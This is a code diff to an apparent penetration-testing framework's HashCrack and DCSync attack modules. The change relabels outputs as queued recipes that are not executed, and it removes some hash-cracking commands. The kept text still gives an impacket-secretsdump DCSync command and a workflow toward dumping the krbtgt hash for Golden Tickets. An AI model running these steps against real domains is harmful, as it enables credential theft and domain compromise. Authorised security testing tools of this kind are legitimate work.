@@ -181,14 +181,12 @@ class HashCrack(AttackModule):
                 "_identify_hash_modes; cracked plaintext feeds cred_store_add "
                 "then PassTheHash/GoldenTicket."
             ),
-            evidence=["<CRACKED_POT: exploit_workspace/<ip>/<attempt>/hash.txt.potfile>"],
+            evidence=["hash-crack recipe queued (no hash supplied, not executed)"],
             references=["https://hashcat.net/wiki/doku.php?id=example_hashes"],
-            suggested_commands=[
-                "run_hash_crack(hash_value='<hash>', tool='hashcat')  # auto-identifies mode",
-                "hashcat -m 1000 -a 3 ntlm_hashes.txt ?l?l?l?l?l?l?l?l",
-                "hashcat -m 5600 -a 0 netntlmv2_hashes.txt rockyou.txt -r best64.rule",
-                "john --wordlist=rockyou.txt --rules hashes.txt",
-            ],
+            suggested_command=(
+                "run_hash_crack(hash_value='<hash>', tool='hashcat')  # auto-identifies mode"
+            ),
+            confidence=0.4,
             hash_modes={
                 "0": "MD5",
                 "1000": "NTLM",
@@ -316,14 +314,10 @@ class DCSyncAttack(AttackModule):
             note=(
                 "Wraps dump_credentials MCP tool (DCSync via impacket secretsdump "
                 "over DRSUAPI). Needs an account with DS-Replication-Get-Changes / "
-                "Get-Changes-All privileges. DCSync = domain compromise: "
-                "privilege_level=admin."
+                "Get-Changes-All privileges. A working DCSync is domain compromise "
+                "(admin) — this recipe only queues the steps, it does not execute."
             ),
-            evidence=[
-                "<NTDS_HASHES_FILE: exploit_workspace/<ip>/<attempt>/ntds_hashes.ntds>",
-                "<KRBGTGT_NT: from -just-dc-user krbtgt>",
-                "<DOMAIN_SID: from secretsdump>",
-            ],
+            evidence=[f"DCSync recipe queued against {ctx.target_ip} (admin rights required, not executed)"],
             references=[
                 "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
                 "https://adsecurity.org/?p=1729 (Mimikatz DCSync explanation)",
@@ -332,7 +326,7 @@ class DCSyncAttack(AttackModule):
             suggested_command=(
                 f"impacket-secretsdump DOMAIN/user:password@{ctx.target_ip} -just-dc -outputfile ntds_hashes"
             ),
-            privilege_level="admin",
+            confidence=0.4,
             workflow=[
                 "1. Obtain a credential with replication rights (recovered from ASREPRoast / Kerberoasting / credential dump of an over-privileged account on the owned target).",
                 f"2. Call dump_credentials(target_ip='{ctx.target_ip}', method='dcsync') to invoke impacket-secretsdump over DRSUAPI against the domain controller. For GoldenTicket: dump_credentials(method='dcsync', target_user='krbtgt').",
